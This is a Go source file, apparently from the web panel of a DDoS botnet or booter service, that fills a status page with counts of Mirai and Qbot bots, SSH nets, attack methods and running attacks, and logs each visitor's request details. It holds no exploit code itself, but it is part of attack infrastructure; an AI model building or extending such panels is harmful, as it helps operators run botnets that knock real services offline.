package api

import (
	"Manager/database"
	"fmt"
	"io"
	"net/http"
	"os"
	"strconv"
	"strings"
)

func readInfo() string {
	file, err := os.Open("config/info.tmpl")
	database.CheckError(err)
	defer func(file *os.File) {
		err := file.Close()
		database.CheckError(err)
	}(file)
	html, err := io.ReadAll(file)
	database.CheckError(err)
	methodsSpace := ""
	methodsNL := ""
	for _, method := range database.Methods.Methods {
		methodsSpace += method.Name + " "
		methodsNL += method.Name + "\r\n"
	}
	serversSpace := ""
	serversNL := ""
	for _, server := range database.Servers.Servers {
		for key := range server {
			serversSpace += key + " "
			serversNL += key + "\r\n"
		}
	}
	mlen := strconv.Itoa(len(database.Methods.Methods))
	ulen := strconv.Itoa(len(database.Users))
	clen := strconv.Itoa(database.GetActiveCons())
	conLimit := strconv.Itoa(database.Config.MaxCons)
	qbotlen := strconv.Itoa(len(database.Qbots))
	mirialen := strconv.Itoa(len(database.Mirai))
	serverlen := strconv.Itoa(len(database.Servers.Servers))
	attacks := strconv.Itoa(len(database.Attacks))
	site := strings.NewReplacer("[BotCount]", strconv.Itoa(len(database.Mirai)+len(database.Qbots)), "[SSHs]", strconv.Itoa(len(database.Nets.SSHs)), "[Version]", database.Version, "[Attacks]", attacks, "[UserCount]", ulen, "[MethodCount]", mlen, "[ServerCount]", serverlen, "[ServersSpace]", serversSpace, "[ServersNL]", serversNL, "[Concurrents]", clen, "[ConcurrentLimit]", conLimit, "[QbotCount]", qbotlen, "[MiraiCount]", mirialen, "[MethodsSpace]", methodsSpace, "[MethodsNL]", methodsNL).Replace(string(html))
	return site
}

func IndexPage(w http.ResponseWriter, r *http.Request) {
	w.WriteHeader(http.StatusOK)
	if database.DetectHTML(readInfo()) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
	} else {
		w.Header().Set("Content-Type", "text/plain; charset=utf-8")
	}
	_, err := fmt.Fprintf(w, readInfo())
	database.LogRequests("==== [ Requested Index Page ] ====")
	database.LogRequests("IP: " + r.RemoteAddr)
	database.LogRequests("Method: " + r.Method)
	database.LogRequests("User-Agent: " + r.UserAgent())
	database.LogRequests("Full URL: " + r.URL.String())
	database.LogRequests("Query: " + r.URL.RawQuery)
	database.LogRequests(fmt.Sprintf("Content-Length: %s", r.Header.Get("Content-Length")))
	database.LogRequests(fmt.Sprintf("Content-Type: %s", r.Header.Get("Content-Type")))
	database.LogRequests(fmt.Sprintf("Referer: %s", r.Header.Get("Referer")))
	database.LogRequests(fmt.Sprintf("Origin: %s", r.Header.Get("Origin")))
	database.LogRequests("=================================")
	database.CheckError(err)
}
